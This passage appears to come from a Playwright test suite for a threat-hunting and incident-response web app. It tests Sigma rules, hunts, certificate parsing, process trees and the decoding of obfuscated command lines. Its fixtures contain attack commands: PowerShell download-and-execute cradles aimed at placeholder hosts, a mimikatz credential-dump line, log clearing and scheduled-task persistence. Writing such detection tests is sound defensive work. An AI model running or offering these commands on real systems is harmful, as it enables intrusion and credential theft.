      'EventID=1 Image=C:\\Windows\\System32\\schtasks.exe CommandLine="schtasks /create /sc minute /tn Updater /tr C:\\ProgramData\\u.exe"',
      'EventID=1 Image=C:\\Windows\\System32\\wevtutil.exe CommandLine="wevtutil cl Security"', 'EventID=1 Image=C:\\Windows\\System32\\net.exe CommandLine="net user /domain"',
      'allow tcp 10.0.0.5:51022 -> 203.0.113.47:4444', 'mimikatz sekurlsa::logonpasswords', 'x'.repeat(30000) + ' powershell -enc SQBFAFgA'];
    const recs = [...DB.records.filter(r => r.type !== 'lead'), ...extra.map((b, i) => ({ id: 'q' + i, title: 'T' + i, body: b, host: '', source: '', ents: [], tags: [] }))];
    (DB.rules.filter(r => r.tests).flatMap(r => r.tests) || []).forEach((t, i) => recs.push({ id: 't' + i, title: '', body: t.text, host: '', source: '', ents: [], tags: [] }));
    /* an event built from each rule's own values, so most rules have something to fire on */
    DB.rules.filter(r => r.type === 'sigma').forEach((r, i) => { let p; try { p = sigmaParse(r.code); } catch (e) { return; }
      const kv = []; for (const [name, sel] of Object.entries(p.det)) { if (/filter/i.test(name)) continue; for (const fd of sel.fields) { const [f, ...m] = fd.f.split('|'), v = String(fd.vals[0] || '').replace(/\*/g, '');
          const val = m.includes('endswith') ? 'C:\\Windows\\' + v.replace(/^\\/, '') : m.includes('startswith') ? v + 'x' : m.includes('contains') ? 'a ' + v + ' b' : v; kv.push(f + '="' + val.replace(/"/g, "'") + '"'); } break; }
      if (kv.length) recs.push({ id: 'g' + i, title: '', body: kv.join(' '), host: '', source: '', ents: [], tags: [] }); });
    const F = recs.map(recFields), I = sigmaIndex(F); let diff = [], checked = 0, hits = 0;
    for (const r of DB.rules.filter(r => r.type === 'sigma')) { let p; try { p = sigmaParse(r.code); } catch (e) { continue; } if (!p.cond) continue;
      const full = new Set(); F.forEach((f, i) => { try { if (sigmaEval(p, f)) full.add(i); } catch (e) {} });
      const C = sigmaCands(I, p), fast = new Set([...(C || F.keys())].filter(i => { try { return sigmaEval(p, F[i]); } catch (e) { return false; } }));
      checked++; hits += full.size; if (full.size !== fast.size || [...full].some(i => !fast.has(i))) diff.push(r.title); }
    return { checked, hits, diff, covered: DB.rules.filter(r => r.type === 'sigma').filter(r => { try { return !!sigmaNeedles(sigmaParse(r.code)); } catch (e) { return false; } }).length };
  });
  expect(R.diff).toEqual([]);
  expect(R.checked).toBeGreaterThan(300); expect(R.hits).toBeGreaterThan(50);       // it was a real test: many rules fired
  expect(R.covered).toBeGreaterThan(280);                                          // and most rules use the fast path
  noErrors(errors);
});

test('every action name belongs to exactly one feature', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => ({ conflicts: actConflicts(), n: actIndex().size, maps: ACT_MAPS.filter(n => !ACT_GET[n]()) }));
  expect(R.maps).toEqual([]);                      // every listed map exists
  expect(R.n).toBeGreaterThan(300);
  expect(R.conflicts).toEqual([]);
  noErrors(errors);
});

test('a rule at a glance: tests, history, where it fires and look-alikes in one line, each a click from the detail', async ({ page }) => {
  const errors = await open(page, '#/detections');
  await page.evaluate(() => {
    const code = "title: Glance\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    s:\n        Image|endswith: '\\\\whoami.exe'\n    condition: s\nlevel: low";
    const r = { id: 'r-gl', type: 'sigma', title: 'Glance', desc: '', code, severity: 'low', category: 'process', technique: '', author: 'You', platform: 'Windows', tags: [], created: Date.now(), modified: Date.now(),
      tests: [{ id: 't1', kind: 'hit', text: 'Image="C:\\\\Windows\\\\System32\\\\whoami.exe"' }, { id: 't2', kind: 'hit', text: 'Image="C:\\\\Windows\\\\notepad.exe"' }] };
    DB.rules.unshift(r, { ...r, id: 'r-gl2', title: 'Glance twin', tests: [] }); rvKeep(r, { ...r, title: 'Glance' + ' v0', code: r.code + '\n' }); dlAfterSave(r);
    UI.dview = 'rules'; UI.rule = 'r-gl'; UI.ropen = true; UI.rtab = 'rule'; renderMain();
  });
  const sum = page.locator('form.rx .rsum');
  await expect(sum).toContainText('1 of 2 tests fail'); await expect(sum).toContainText('1 earlier version'); await expect(sum).toContainText('check all rules');
  await sum.locator('[data-act=rsTab][data-v=tests]').click(); await expect(page.locator('#dlPane .dl-tests')).toBeVisible();
  await sum.locator('[data-act=rsTab][data-v=history]').click(); await expect(page.locator('#dlPane .rv-t')).toBeVisible();
  await sum.locator('[data-act=rsHealth]').click();
  await expect(page.locator('form.rx .rsum')).toContainText('checked', { timeout: 30000 });
  await expect(page.locator('form.rx .rsum')).toContainText('Like Glance twin');
  noErrors(errors);
});

test('verdicts age: dated when set however they are set, IPs fade, hashes do not, old links count for less, and Today asks to recheck', async ({ page }) => {
  const errors = await open(page, '#/home');
  const ip = 'ipv4:198.51.100.77', hash = 'sha256:' + 'a'.repeat(64);
  // set through the panel button and directly (as automations do): both get a date at the next save
  await page.evaluate(k => { UI.sel = { kind: 'ent', id: k }; UI.inspOpen = true; renderAll(); }, ip);
  await page.locator('#insp [data-act=entVerdict][data-v=malicious]').click();
  await page.evaluate(h => { DB.verdicts[h] = 'malicious'; flush(); }, hash);
  const R = await page.evaluate(([ip, h]) => ({ ipAt: !!verdictAt(ip), hAt: !!verdictAt(h), w: +verdictWeight(ip).toFixed(3), unknown: verdictWeight('ipv4:198.51.100.200') }), [ip, hash]);
  expect(R).toEqual({ ipAt: true, hAt: true, w: 1, unknown: 1 });
  // two hundred days later
  const A = await page.evaluate(([ip, h]) => { const old = Date.now() - 200 * 864e5; DB.verdictAt[ip] = old; DB.verdictAt[h] = Date.now() - 900 * 864e5;
    return { ip: +verdictWeight(ip).toFixed(2), hash: verdictWeight(h), stale: verdictStale(ip), hashStale: verdictStale(h) }; }, [ip, hash]);
  expect(A).toEqual({ ip: 0.21, hash: 1, stale: true, hashStale: false });
  await page.evaluate(() => renderAll());
  await expect(page.locator('#insp .vd-age.stale')).toContainText('worth checking again');
  // a link resting only on that old verdict is no longer "strong"
  const L = await page.evaluate(ip => {
    ['X', 'Y'].forEach(x => DB.cases.push({ id: 'c-v' + x, code: 'V-' + x, name: 'V ' + x, color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }));
    let i = 0; for (const c of ['c-vX', 'c-vY']) DB.records.push({ id: 'r-v' + (i++), caseId: c, type: 'evidence', title: 'x', body: 'beacon 198.51.100.77', ts: Date.now(), source: 's', host: '', tags: [], ents: extractRich('beacon 198.51.100.77'), addedAt: Date.now() });
    rev++; const x = caseLinks('c-vX').find(l => l.c.id === 'c-vY'); const before = x.strength;
    DB.verdictAt[ip] = Date.now(); rev++; const y = caseLinks('c-vX').find(l => l.c.id === 'c-vY');
    DB.verdictAt[ip] = Date.now() - 200 * 864e5; rev++; return { old: before, fresh: y.strength, oldW: x.shared[0].w < y.shared[0].w }; }, ip);
  expect(L).toEqual({ old: 'some', fresh: 'strong', oldW: true });
  // Today asks to check it again; taking the verdict away drops its date
  const T = await page.evaluate(() => todayItems().items.some(x => /verdict.*old/.test(x.t)));
  expect(T).toBe(true);
  await page.locator('#insp [data-act=entVerdict][data-v=""]').click(); await page.evaluate(() => flush());
  expect(await page.evaluate(ip => verdictAt(ip), ip)).toBe(null);
  noErrors(errors);
});

test('saved hunts: a search or a rule across all cases; what matched when saved is seen, later evidence is new on the hunt and on Today', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => { ['P', 'Q'].forEach(x => DB.cases.push({ id: 'c-h' + x, code: 'H-' + x, name: 'Hunt ' + x, color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }));
    let i = 0; const rec = (c, b, host) => DB.records.push({ id: 'r-h' + (i++), caseId: c, type: 'evidence', title: b.slice(0, 40), body: b, ts: Date.now() - 1e6 + i, source: 's', host: host || 'WS', tags: [], ents: extractRich(b), addedAt: Date.now() });
    rec('c-hP', 'beacon to 198.51.100.66 port 443'); rec('c-hP', 'EventID=1 Image=C:\\Windows\\System32\\whoami.exe CommandLine="whoami /all"', 'DC01'); rec('c-hQ', 'ordinary event'); rev++;
    UI.q = '198.51.100.66'; UI.ast = E.parseQuery(UI.q); UI.tlMode = 'events'; go(caseHash('c-hP', 'timeline')); });
  // save the timeline filter as a hunt
  await page.click('[data-act=huSave]'); await page.fill('#huName', 'C2 comes back'); await page.click('#dlg [type=submit]');
  await expect(page.locator('#toastMsg')).toContainText('1 match now');
  // and a rule hunt from the dialog
  await page.click('[data-act=huNew]'); await page.fill('#huName', 'Whoami anywhere'); await page.click('[data-act=huKind][data-v=rule]');
  const rt = await page.evaluate(() => { const r = DB.rules.find(x => x.type === 'sigma' && /whoami/i.test(x.code) && (() => { try { const p = sigmaParse(x.code); return sigmaEval(p, recFields(DB.records.find(r => r.id === 'r-h1'))); } catch (e) { return false; } })()); return r && r.title; });
  expect(rt).toBeTruthy(); await page.fill('#huR', rt); await page.click('#dlg [type=submit]');
  // duplicates and empty searches are refused
  await page.click('[data-act=huNew]'); await page.fill('#huName', 'c2 comes  BACK'); await page.fill('#huQ', 'x'); await page.click('#dlg [type=submit]'); await expect(page.locator('#dlg .ferr')).toContainText('already exists');
  await page.fill('#huName', 'Another'); await page.fill('#huQ', ''); await page.click('#dlg [type=submit]'); await expect(page.locator('#dlg .ferr')).toContainText('Write what to look for'); await page.click('#dlg [data-act=dclose]');
  expect(await page.evaluate(() => huntList().map(h => [h.name, huntRun(h).matches.length, huntRun(h).fresh.length]))).toEqual([['C2 comes back', 1, 0], ['Whoami anywhere', 1, 0]]);
  // new evidence in another case: new on the hunt and on Today
  await page.evaluate(() => { DB.records.push({ id: 'r-hnew', caseId: 'c-hQ', type: 'evidence', title: 'Proxy saw 198.51.100.66', body: 'GET http://198.51.100.66/a', ts: Date.now(), source: 'proxy', host: 'PX', tags: [], ents: extractRich('GET http://198.51.100.66/a'), addedAt: Date.now() }); mutate('new'); renderMain(); });
  await expect(page.locator('.hu:has-text("C2 comes back") .chip.red').first()).toContainText('1 new');
  await expect(page.locator('.hu:has-text("C2 comes back") .hu-c')).toContainText('Hunt Q');
  expect(await page.evaluate(() => todayItems().items.some(x => /Hunt “C2 comes back”: 1 new match/.test(x.t)))).toBe(true);
  // open the case from the hunt: the timeline is filtered by the same search
  await page.locator('.hu:has-text("C2 comes back") [data-act=huCase][data-v=c-hQ]').click();
  expect(await page.evaluate(() => [UI.q, UI.tlMode, !!UI.ast])).toEqual(['198.51.100.66', 'events', true]);
  await page.evaluate(() => { UI.dview = 'hunts'; go('#/detections'); });
  await page.locator('.hu:has-text("C2 comes back") [data-act=huSeen]').click();
  expect(await page.evaluate(() => huntRun(huntList()[0]).fresh.length)).toBe(0);
  // a deleted rule is said, not crashed on; delete with undo
  await page.evaluate(() => { const h = huntList()[1]; DB.rules = DB.rules.filter(r => r.id !== h.ruleId); mutate('x'); renderMain(); });
  await expect(page.locator('.hu:has-text("Whoami anywhere")')).toContainText('The rule was deleted');
  await page.locator('.hu:has-text("Whoami anywhere") [data-act=huDel]').click(); expect(await page.evaluate(() => huntList().length)).toBe(1);
  await page.click('#toastBtn'); expect(await page.evaluate(() => huntList().length)).toBe(2);
  // junk from a backup is tidied
  expect(await page.evaluate(() => { DB.hunts = [...DB.hunts, null, { id: 'x', name: 'bad', kind: 'query', q: '' }, { id: 'y', name: 5 }]; return huntList().length; })).toBe(2);
  noErrors(errors);
});

test('a note from selected events: a plain-words summary, the chronology with citations that open each event, and a filter to all of them', async ({ page }) => {
  const errors = await open(page, '#/home');
  const ids = await page.evaluate(() => { const D = derive('c-lantern'), L = D.recs.filter(r => r.type !== 'lead' && r.ts).sort((a, b) => a.ts - b.ts);
    const pick = [L.find(r => /invoice email/i.test(r.title)), L.find(r => /LNK opened/i.test(r.title)), ...L.filter(r => /beacon/i.test(r.title)).slice(0, 2)].filter(Boolean).map(r => r.id);
    DB.active = 'c-lantern'; UI.tlMode = 'events'; UI.tlSel = true; UI.evPick = new Set(pick); go(caseHash('c-lantern', 'timeline')); return pick; });
  expect(ids.length).toBe(4);
  await page.click('[data-act=evNote]');
  const n = await page.evaluate(() => { const n = DB.notes[0]; return { title: n.title, text: n.text, refs: n.refs, caseId: n.caseId }; });
  expect(n.caseId).toBe('c-lantern'); expect(n.refs).toEqual(ids);
  expect(n.text).toMatch(/^4 events on .+, 2026-09-14 08:52:10 to .+\(/);          // the opening sentence: count, hosts, span
  expect(n.text).toMatch(/They pass through .*→/); expect(n.text).toMatch(/marked malicious: /);
  expect(n.text).toMatch(/## Chronology\n- 08:52:10 MX01 — Invoice email delivered to finance \[1\]/); expect(n.text).toContain('[4]');
  // on the notes page the citations are links
  await page.evaluate(() => go('#/notes'));
  const card = page.locator('.note-card', { has: page.locator('.ncite') }).first();
  await expect(card.locator('.ncite')).toHaveCount(4);
  await card.locator('.ncite').nth(1).click();
  await expect.poll(() => page.evaluate(() => [UI.route.tab, UI.sel && UI.sel.id])).toEqual(['timeline', ids[1]]);   // the page changes on the next tick
  // all cited events, as a timeline filter that can be cleared
  await page.evaluate(() => go('#/notes')); await page.locator('.note-card [data-act=nCiteAll]').first().click();
  await expect(page.locator('.tlbar')).toContainText('4 events a note cites');
  expect(await page.evaluate(() => derive('c-lantern').recs.filter(passes).length)).toBe(4);
  await page.click('[data-act=idsOff]'); expect(await page.evaluate(() => !!UI.facet.ids)).toBe(false);
  // editing the note keeps its citations; a deleted event's citation stays plain text
  const nid = await page.evaluate(() => DB.notes[0].id);
  await page.evaluate(i => noteDlg(i), nid); await page.fill('#nTitle', 'Initial access to C2'); await page.click('#dlg [type=submit]');
  expect(await page.evaluate(() => DB.notes[0].refs.length)).toBe(4);
  await page.evaluate(i => { DB.records = DB.records.filter(r => r.id !== i); mutate('x'); go('#/notes'); }, ids[3]);
  await expect(page.locator('.note-card:has-text("Initial access to C2") .ncite')).toHaveCount(3);
  noErrors(errors);
});

test('certificates and signing requests: expiry, full serial and thumbprints up front, checked against an independent hash; decoded in evidence, with thumbprints and names becoming indicators', async ({ page }) => {
  const fs = require('fs'), crypto = require('crypto'), der = f => Buffer.from(fs.readFileSync('tests/fixtures/certs/' + f, 'utf8').replace(/-----[^-]+-----/g, '').replace(/\s+/g, ''), 'base64');
  const H = (f, a) => crypto.createHash(a).update(der(f)).digest('hex').toUpperCase();
  const errors = await open(page, '#/certs');
  await page.evaluate(t => { cxLoad(t); renderMain(); }, fs.readFileSync('tests/fixtures/certs/leaf-phish.pem', 'utf8'));
  const facts = page.locator('.cxf').first();
  await expect(facts).toContainText(H('leaf-phish.pem', 'sha1'));                      // Windows-style thumbprint
  await expect(facts).toContainText(H('leaf-phish.pem', 'sha256').replace(/(..)(?=.)/g, '$1:'));
  await expect(facts).toContainText('Expires'); await expect(facts).toContainText('2027-01-27'); await expect(facts).toContainText(/Valid — \d+ days left/);
  await expect(facts).toContainText('17:54:6D:F5:96:32:5F:95:1F:94:61:23:26:BF:0E:2D:51:C4:EB:E4');   // the whole serial, not cut short
  await expect(facts).toContainText('OCSP http://ocsp.example-trust.test');
  // copy gives the plain hex the tools expect
  const copied = await page.evaluate(() => { let v = null; const o = window.copyText; window.copyText = x => { v = x; }; document.querySelector('.cxf [aria-label="Copy Thumbprint SHA-1"]').click(); window.copyText = o; return v; });
  expect(copied).toBe(H('leaf-phish.pem', 'sha1'));
  // a signing request: its own thumbprints, every subject part, the challenge password in full
  await page.evaluate(t => { cxLoad(t); renderMain(); }, fs.readFileSync('tests/fixtures/certs/request.csr', 'utf8'));
  const q = page.locator('.crt-csr .cxf');
  await expect(q).toContainText(H('request.csr', 'sha1')); await expect(q).toContainText('PKCS#10 v1');
  await expect(q).toContainText('Organisation'); await expect(q).toContainText('Acme Industries Ltd'); await expect(q).toContainText('Country');
  await expect(q).toContainText('notsecret');
  // an expired certificate pasted into a case: decoded in the evidence panel, and it gives the case indicators
  await page.evaluate(t => { DB.active = 'c-lantern'; DB.records.push({ id: 'r-pem', caseId: 'c-lantern', type: 'evidence', title: 'cert from the VPN', body: 'seen on the VPN:\n' + t, ts: Date.now(), source: 'paste', host: '', tags: [], ents: [], addedAt: Date.now() }); mutate('pasted a certificate');
    UI.sel = { kind: 'rec', id: 'r-pem' }; UI.inspOpen = true; go(caseHash('c-lantern', 'timeline')); }, fs.readFileSync('tests/fixtures/certs/expired.pem', 'utf8'));
  const dec = page.locator('#insp .cx-rec');
  await expect(dec).toContainText('Expired'); await expect(dec).toContainText(H('expired.pem', 'sha1'), { timeout: 10000 });
  await expect.poll(() => page.evaluate(() => DB.records.find(r => r.id === 'r-pem').ents.map(e => e.k)), { timeout: 10000 }).toEqual(expect.arrayContaining(['sha256', 'sha1', 'domain']));
  expect(await page.evaluate(h => derive('c-lantern').ents.has('sha1:' + h.toLowerCase()), H('expired.pem', 'sha1'))).toBe(true);
  await dec.locator('[data-act=cxDecodeRec]').click();
  await expect(page).toHaveURL(/#\/certs/); await expect(page.locator('.cxf').first()).toContainText(H('expired.pem', 'sha1'));
  // a chain in one record: each certificate decoded; a hostile certificate shows as text
  await page.evaluate(t => { DB.records.push({ id: 'r-chain', caseId: 'c-lantern', type: 'evidence', title: 'chain', body: t, ts: Date.now(), source: 'paste', host: '', tags: [], ents: [], addedAt: Date.now() }); rev++; UI.sel = { kind: 'rec', id: 'r-chain' }; UI.inspOpen = true; go(caseHash('c-lantern', 'timeline')); },
    fs.readFileSync('tests/fixtures/certs/chain-phish.pem', 'utf8') + '\n' + fs.readFileSync('tests/fixtures/certs/hostile.pem', 'utf8'));
  await expect(page.locator('#insp .cx-rec .cx-rec-h')).toHaveCount(3);                 // the two in the chain and the hostile one
  await expect(page.locator('#insp .cx-rec img, #insp .cx-rec script')).toHaveCount(0);
  noErrors(errors);
});

// endpoint evidence: decoded command lines, process trees, lateral movement, rare things
const u16 = s => Buffer.from(s, 'utf16le').toString('base64'), u8 = s => Buffer.from(s, 'utf8').toString('base64');

test('command lines: -enc, FromBase64String, [char] codes, joined strings, backticks and nesting are decoded; everyday command lines and hashes are left alone', async ({ page }) => {
  const errors = await open(page, '#/home');
  const inner = "IEX (New-Object Net.WebClient).DownloadString('http://cdn-sync.example/a.ps1')";
  const C = {
    enc: `powershell.exe -NoP -NonI -W Hidden -Enc ${u16(inner)}`,
    e: `powershell -e ${u16('whoami /all')}`,
    quoted: `"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -EncodedCommand "${u16('Get-Process lsass')}"`,
    fb64: `powershell -c "$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${u8('Invoke-WebRequest http://203.0.113.200/x.exe -OutFile C:\\ProgramData\\x.exe')}'));iex $s"`,
    chararr: `powershell -c "iex ([char[]](73,69,88,32,40,103,99,105,41) -join '')"`,
    charplus: `powershell -c "&([char]73+[char]69+[char]88) 'calc'"`,
    concat: `powershell -c "(New-Object Net.WebClient).('Down'+'load'+'String')('http://'+'evil-cdn'+'.example/p')"`,
    tick: 'powershell -c "I`E`X (N`ew-Ob`je`ct Net.WebClient).Downl`oadString(\'http://tick.example/z\')"',
    nested: `powershell -enc ${u16(`$x=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${u8('Start-Process C:\\Users\\Public\\beacon.exe')}'));iex $x`)}`,
  };
  const N = {
    git: '"C:\\Program Files\\Git\\cmd\\git.exe" commit -m "fix login + logout"',
    hash: 'certutil -hashfile C:\\Temp\\setup.exe SHA256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    guid: 'msiexec.exe /i {7C23E0B4-5A0E-4C8B-9C3A-1F5D2B3E4A6F} /qn',
    path: 'C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule',
    tab: 'powershell -c "Write-Host `tIndented`n"',
  };
  const R = await page.evaluate(({ C, N }) => ({ hit: Object.fromEntries(Object.entries(C).map(([k, v]) => [k, cmdDecode(v).map(s => [s.how, s.out])])), miss: Object.fromEntries(Object.entries(N).map(([k, v]) => [k, cmdDecode(v).length])) }), { C, N });
  const last = k => R.hit[k][R.hit[k].length - 1][1];
  expect(R.hit.enc[0][0]).toMatch(/EncodedCommand/); expect(last('enc')).toBe(inner);
  expect(last('e')).toBe('whoami /all');
  expect(last('quoted')).toBe('Get-Process lsass');
  expect(R.hit.fb64[0][0]).toBe('FromBase64String'); expect(last('fb64')).toContain('http://203.0.113.200/x.exe');
  expect(last('chararr')).toBe('IEX (gci)');
  expect(last('charplus')).toContain('"IEX"');
  expect(last('concat')).toContain('"DownloadString"'); expect(last('concat')).toContain('"http://evil-cdn.example/p"');
  expect(last('tick')).toContain("IEX (New-Object Net.WebClient).DownloadString('http://tick.example/z')");
  expect(R.hit.nested.map(x => x[0])).toEqual(['-EncodedCommand (Base64, UTF-16)', 'FromBase64String']); expect(last('nested')).toBe('Start-Process C:\\Users\\Public\\beacon.exe');
  expect(R.miss).toEqual({ git: 0, hash: 0, guid: 0, path: 0, tab: 0 });

  // in a case: the decoded text gives its indicators to the event, and the evidence panel shows it decoded
  const S = await page.evaluate(async ({ C }) => {
    DB.cases.push({ id: 'c-dec', code: 'DE-1', name: 'Decode', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const r = { id: 'r-dec1', caseId: 'c-dec', type: 'evidence', title: 'Process created', body: `EventID=1 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine="${C.enc}"`, ts: Date.UTC(2024, 4, 2, 9), tsRaw: '', tsZone: 'explicit', source: 'sysmon', host: 'WS-1', tags: [], ents: [], addedAt: Date.now() };
    r.ents = extractRich(r.body); const before = r.ents.some(e => e.v === 'cdn-sync.example');
    DB.records.push(r); mutate('add'); await new Promise(res => setTimeout(res, 900));
    const D = derive('c-dec'); return { before, after: [...D.ents.values()].filter(e => /cdn-sync/.test(e.v)).map(e => e.k + ':' + e.v).sort() };
  }, { C });
  expect(S.before).toBe(false);
  expect(S.after).toEqual(['domain:cdn-sync.example', 'url:http://cdn-sync.example/a.ps1']);
  await page.evaluate(() => { DB.active = 'c-dec'; UI.tlMode = 'events'; UI.sel = { kind: 'rec', id: 'r-dec1' }; UI.inspOpen = true; go(caseHash('c-dec', 'timeline')); });
  await expect(page.locator('.isec', { hasText: 'Command line, decoded' })).toContainText("DownloadString('http://cdn-sync.example/a.ps1')");
  noErrors(errors);
});

test('process trees from a real Sysmon XML export and 4688 events: joined by GUID, by hex process ID, by parent path; a reused path does not cross instances; suspicious branches stand out', async ({ page }) => {
  const errors = await open(page, '#/home');
  const enc = u16("IEX (New-Object Net.WebClient).DownloadString('http://cdn-sync.example/a.ps1')");
  const R = await page.evaluate(({ enc }) => {
    const x = s => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
    const ev = (id, t, host, d) => `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="${id > 1000 ? 'Microsoft-Windows-Security-Auditing' : 'Microsoft-Windows-Sysmon'}"/><EventID>${id}</EventID><TimeCreated SystemTime="2024-05-02T${t}.000Z"/><Computer>${host}</Computer></System><EventData>${Object.entries(d).map(([k, v]) => `<Data Name="${k}">${x(v)}</Data>`).join('')}</EventData></Event>`;
    const W = 'ws-hr-03.corp.local', sm = (t, g, pid, img, pg, ppid, pimg, cmd) => ev(1, t, W, { ProcessGuid: g, ProcessId: pid, Image: img, CommandLine: cmd || img, ParentProcessGuid: pg, ParentProcessId: ppid, ParentImage: pimg, User: 'CORP\\amy' });
    const EX = 'C:\\Windows\\explorer.exe', WORD = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', CMD = 'C:\\Windows\\System32\\cmd.exe', PS = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
    const xml = '<Events>' + [
      sm('08:59:00', '{A1}', 4012, EX, '{A0}', 3900, 'C:\\Windows\\System32\\userinit.exe'),
      sm('09:00:00', '{B1}', 5120, WORD, '{A1}', 4012, EX, `"${WORD}" /n "C:\\Users\\amy\\Downloads\\Payroll_Q3.docm"`),
      sm('09:00:40', '{C1}', 6200, CMD, '{B1}', 5120, WORD, `cmd.exe /c powershell -nop -w hidden -enc ${enc}`),
      sm('09:00:41', '{D1}', 6240, PS, '{C1}', 6200, CMD, `powershell -nop -w hidden -enc ${enc}`),
      sm('09:01:10', '{E1}', 7000, 'C:\\Windows\\System32\\rundll32.exe', '{D1}', 6240, PS, 'rundll32.exe C:\\ProgramData\\upd.dll,Start'),
      sm('09:02:00', '{F1}', 7100, 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', '{A1}', 4012, EX),
      // a second Explorer (another sign-in): its notepad must hang under it, not under the first one with the same path
      sm('09:05:00', '{A2}', 8100, EX, '{A9}', 8000, 'C:\\Windows\\System32\\userinit.exe'),
      sm('09:06:00', '{G1}', 8200, 'C:\\Windows\\System32\\notepad.exe', '{A1}', 4012, EX),
      sm('09:06:30', '{G2}', 8300, 'C:\\Windows\\System32\\notepad.exe', '{A2}', 8100, EX),
      // Windows 4688 on the DC: hex IDs, a shell under services.exe writing to ADMIN$ (wmiexec / smbexec style)
      ev(4688, '09:20:00', 'DC01.corp.local', { NewProcessId: '0x1a2c', NewProcessName: CMD, ProcessId: '0x2a4', ParentProcessName: 'C:\\Windows\\System32\\services.exe', CommandLine: 'cmd.exe /Q /c echo cd ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > C:\\Windows\\TEMP\\execute.bat', SubjectUserName: 'DC01$' }),
      ev(4688, '09:20:01', 'DC01.corp.local', { NewProcessId: '0x1b00', NewProcessName: 'C:\\Windows\\System32\\whoami.exe', ProcessId: '0x1a2c', ParentProcessName: CMD, CommandLine: 'whoami', SubjectUserName: 'DC01$' }),
      // PID reuse: a later cmd.exe with the same ID, started long after, must not adopt children of the first
      ev(4688, '15:00:00', 'DC01.corp.local', { NewProcessId: '0x1a2c', NewProcessName: CMD, ProcessId: '0x300', ParentProcessName: EX, CommandLine: 'cmd.exe', SubjectUserName: 'admin' }),
      ev(4688, '15:00:05', 'DC01.corp.local', { NewProcessId: '0x1c00', NewProcessName: 'C:\\Windows\\System32\\ipconfig.exe', ProcessId: '0x1a2c', ParentProcessName: CMD, CommandLine: 'ipconfig /all', SubjectUserName: 'admin' }),
    ].join('\n') + '</Events>';
    DB.cases.push({ id: 'c-pt', code: 'PT-1', name: 'Trees', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const P = logParse(xml, 'sec.xml'), cols = [...new Set(P.rows.slice(0, 200).flatMap(r => Object.keys(r)))], M = { time: logGuess(cols, 'time'), title: logGuess(cols, 'title'), host: logGuess(cols, 'host'), source: logGuess(cols, 'source') };
    for(const row of P.rows){ const r = logRec(row, M, 'sec.xml'); r.caseId = 'c-pt'; DB.records.push(r); } mutate('import');
    const H = epTrees(derive('c-pt')), b = n => n.image.split('\\').pop().toLowerCase();
    const shape = n => b(n) + (n.synthetic ? '?' : '') + (n.kids.length ? '(' + n.kids.map(shape).join(',') + ')' : '');
    const flags = []; const walk = n => { if(n.why && n.why.length) flags.push(b(n) + ': ' + n.why.join(' | ')); n.kids.forEach(walk); }; H.forEach(h => h.roots.forEach(walk));
    const hot = []; const w2 = n => { if(n.hot) hot.push(b(n)); n.kids.forEach(w2); }; H.forEach(h => h.roots.forEach(w2));
    return { hosts: H.map(h => [h.host, h.n, h.roots.map(shape).join(' ; ')]), flags, hot, n: P.rows.length };
  }, { enc });
  expect(R.n).toBe(13);
  expect(R.hosts).toEqual([
    ['WS-HR-03', 9, 'userinit.exe?(explorer.exe(winword.exe(cmd.exe(powershell.exe(rundll32.exe))),chrome.exe,notepad.exe),explorer.exe(notepad.exe))'],
    ['DC01', 4, 'services.exe?(cmd.exe(whoami.exe)) ; explorer.exe?(cmd.exe(ipconfig.exe))'],
  ]);
  const f = R.flags.join('\n');
  expect(f).toMatch(/cmd\.exe: .*WINWORD\.EXE started cmd\.exe/);
  expect(f).toMatch(/powershell\.exe: .*(ncoded|bfuscated)/i);
  expect(f).toMatch(/rundll32\.exe: .*signed Windows program/i);
  expect(f).toMatch(/cmd\.exe: .*a shell under services\.exe/);
  expect(f).not.toMatch(/chrome|notepad|ipconfig|explorer|whoami/);
  // the hot path is the chain to the suspicious processes, not the quiet siblings
  expect(R.hot).toEqual(expect.arrayContaining(['userinit.exe', 'explorer.exe', 'winword.exe', 'cmd.exe', 'powershell.exe', 'rundll32.exe', 'services.exe']));
  expect(R.hot).not.toContain('chrome.exe'); expect(R.hot).not.toContain('notepad.exe');

  await page.evaluate(() => { DB.active = 'c-pt'; UI.tlMode = 'procs'; UI.epOnly = true; go(caseHash('c-pt', 'timeline')); });
  const ws = page.locator('.ep-h', { hasText: 'WS-HR-03' });
  await expect(ws.locator('li.flag')).toHaveCount(3);
  await expect(ws).not.toContainText('chrome.exe'); await expect(ws).toContainText('2 quiet branches hidden');
  await expect(ws.locator('.ep-dec').first()).toContainText("DownloadString('http://cdn-sync.example/a.ps1')");
  await page.click('[data-act=epOnly][data-v="0"]');
  await expect(ws).toContainText('chrome.exe'); await expect(ws.locator('.ep-b', { hasText: 'notepad.exe' })).toHaveCount(2);
  await ws.locator('.ep-b', { hasText: 'rundll32.exe' }).click();
  expect(await page.evaluate(() => [UI.tlMode, recById(UI.sel.id).body.includes('upd.dll')])).toEqual(['events', true]);
  noErrors(errors);
});

test('lateral movement: network and RDP logons, PsExec, RDP and explicit-credential records and SMB connections become host → host moves, with addresses named; local, interactive and self logons do not', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    DB.cases.push({ id: 'c-mv', code: 'MV-1', name: 'Moves', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const T = Date.UTC(2024, 4, 2, 9), M = 6e4; let i = 0;
